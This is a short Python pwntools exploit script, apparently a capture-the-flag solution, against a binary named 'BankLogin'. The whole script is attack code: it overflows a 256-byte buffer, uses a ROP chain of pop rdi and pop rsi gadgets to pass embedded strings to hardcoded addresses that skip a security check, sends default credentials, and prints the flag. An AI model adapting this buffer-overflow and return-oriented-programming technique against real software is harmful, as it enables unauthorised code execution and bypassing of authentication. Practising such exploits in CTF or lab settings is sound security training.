from pwn import *

# Set up binary and context
binary = ELF("./BankLogin")  # Replace with actual binary name
context.binary = binary

# Start process (or remote if deployed on a server)
p = process(binary.path)
gdb.attach(p, '''b * main +526
b * security_check +8
b * security_check +148
''')

# Offsets
buffer_size = 256  # Buffer length
sfp_size = 8       # Saved frame pointer
ret_offset = buffer_size + sfp_size  # Offset to overwrite return address

# Find useful gadgets
rop = ROP(binary)
pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]  # Gadget for setting RDI
pop_rsi = rop.find_gadget(["pop rsi", "ret"])[0]  # Gadget for setting RSI
pop_rdx = rop.find_gadget(["pop rdx", "ret"])[0]  # Gadget for setting RDX (if needed)
ret_gadget = rop.find_gadget(["ret"])[0]  # Align stack if necessary

# Function address
security_check = binary.symbols["security_check"]

# Build the payload
payload = b'A' * ret_offset
payload += p64(pop_rdi) + p64(next(binary.search(b"skillissue\x00")))
payload += p64(pop_rsi) + p64(next(binary.search(b"RobinBanks\x00")))
payload += p64(0x0401314)
payload += p64(0x04015c1)

# Interact with program
p.recvuntil("Username: ")
p.sendline("admin")

p.recvuntil("Password: ")
p.sendline("password123")

p.recvuntil("Please enter your security token: ")
p.sendline(payload)
print(p.recvline())
print(p.recvline())

# Get the flag
print(p.recvline())
